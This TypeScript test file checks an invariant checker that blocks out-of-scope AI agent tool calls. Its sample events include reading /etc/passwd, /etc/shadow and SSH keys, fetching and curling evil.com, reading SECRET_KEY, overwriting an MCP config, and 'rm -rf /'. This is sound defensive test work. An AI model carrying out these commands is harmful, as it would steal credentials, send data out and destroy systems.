/**
 * Tier 0: Invariant Enforcement Tests
 *
 * Tests that hard boundaries are enforced regardless of text patterns.
 * Invariant violations produce immediate DENY with severity=critical.
 */

import { describe, it, expect } from 'vitest';
import { InvariantChecker, type SkillManifest } from '../src/tier0-invariant.js';
import type { AgentEvent } from '../src/types.js';

function makeEvent(overrides: Partial<AgentEvent> & { content: string }): AgentEvent {
  return {
    type: 'tool_call',
    timestamp: new Date().toISOString(),
    fields: {},
    ...overrides,
  };
}

describe('Tier 0: Invariant Enforcement', () => {
  const manifests: SkillManifest[] = [
    {
      skillId: 'file-reader',
      allowedPaths: ['/tmp/**', '/home/user/docs/**'],
      allowedHosts: ['api.example.com'],
      allowedEnvVars: ['HOME', 'PATH', 'NODE_ENV'],
      allowedCommands: ['ls', 'cat'],
      allowConfigModification: false,
    },
    {
      skillId: 'network-tool',
      allowedHosts: ['api.example.com', 'cdn.example.com'],
      allowedEnvVars: ['API_KEY'],
    },
  ];

  const checker = new InvariantChecker(manifests);

  describe('Path scope enforcement', () => {
    it('denies access to /etc/passwd when manifest allows /tmp/**', () => {
      const event = makeEvent({
        content: 'readFile("/etc/passwd")',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      expect(violations.length).toBeGreaterThan(0);
      expect(violations[0]!.violationType).toBe('path_scope');
      expect(violations[0]!.observedValue).toBe('/etc/passwd');
    });

    it('allows access to /tmp/data.json when manifest allows /tmp/**', () => {
      const event = makeEvent({
        content: 'readFile("/tmp/data.json")',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      const pathViolations = violations.filter((v) => v.violationType === 'path_scope');
      expect(pathViolations.length).toBe(0);
    });

    it('allows access to /home/user/docs/report.pdf', () => {
      const event = makeEvent({
        content: 'readFile("/home/user/docs/report.pdf")',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      const pathViolations = violations.filter((v) => v.violationType === 'path_scope');
      expect(pathViolations.length).toBe(0);
    });

    it('denies access to /home/user/.ssh/id_rsa', () => {
      const event = makeEvent({
        content: 'readFile("/home/user/.ssh/id_rsa")',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      const pathViolations = violations.filter((v) => v.violationType === 'path_scope');
      expect(pathViolations.length).toBeGreaterThan(0);
    });
  });

  describe('Host scope enforcement', () => {
    it('denies network call to evil.com when manifest allows api.example.com', () => {
      const event = makeEvent({
        content: 'fetch("https://evil.com/steal")',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      const hostViolations = violations.filter((v) => v.violationType === 'host_scope');
      expect(hostViolations.length).toBeGreaterThan(0);
      expect(hostViolations[0]!.observedValue).toBe('evil.com');
    });

    it('allows network call to api.example.com', () => {
      const event = makeEvent({
        content: 'fetch("https://api.example.com/data")',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      const hostViolations = violations.filter((v) => v.violationType === 'host_scope');
      expect(hostViolations.length).toBe(0);
    });
  });

  describe('Env var scope enforcement', () => {
    it('denies access to SECRET_KEY when manifest allows HOME, PATH, NODE_ENV', () => {
      const event = makeEvent({
        content: 'const key = process.env["SECRET_KEY"]',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      const envViolations = violations.filter((v) => v.violationType === 'env_scope');
      expect(envViolations.length).toBeGreaterThan(0);
      expect(envViolations[0]!.observedValue).toBe('SECRET_KEY');
    });

    it('allows access to HOME', () => {
      const event = makeEvent({
        content: 'const home = process.env["HOME"]',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      const envViolations = violations.filter((v) => v.violationType === 'env_scope');
      expect(envViolations.length).toBe(0);
    });
  });

  describe('Command scope enforcement', () => {
    it('denies exec of curl when manifest allows ls, cat', () => {
      const event = makeEvent({
        content: 'exec("curl http://evil.com")',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      const cmdViolations = violations.filter((v) => v.violationType === 'command_scope');
      expect(cmdViolations.length).toBeGreaterThan(0);
    });
  });

  describe('Config modification enforcement', () => {
    it('denies config file modification when allowConfigModification=false', () => {
      const event = makeEvent({
        content: 'writeFile(".mcp.json", "{malicious config}")',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      const configViolations = violations.filter((v) => v.violationType === 'config_modification');
      expect(configViolations.length).toBeGreaterThan(0);
    });
  });

  describe('No manifest = fail-open', () => {
    it('passes through when skill has no manifest', () => {
      const event = makeEvent({
        content: 'exec("rm -rf /")',
        fields: { tool_name: 'unknown-skill' },
      });
      const violations = checker.check(event);
      expect(violations.length).toBe(0);
    });
  });

  describe('No skill ID = skip', () => {
    it('passes through when event has no skill identifier', () => {
      const event = makeEvent({
        content: 'exec("rm -rf /")',
      });
      const violations = checker.check(event);
      expect(violations.length).toBe(0);
    });
  });

  describe('buildDenyMatch', () => {
    it('produces ATRMatch with severity=critical and confidence=1.0', () => {
      const event = makeEvent({
        content: 'readFile("/etc/shadow")',
        fields: { tool_name: 'file-reader' },
      });
      const violations = checker.check(event);
      expect(violations.length).toBeGreaterThan(0);

      const match = checker.buildDenyMatch(violations[0]!);
      expect(match.rule.severity).toBe('critical');
      expect(match.confidence).toBe(1.0);
      expect(match.rule.id).toContain('tier0-invariant');
    });
  });
});
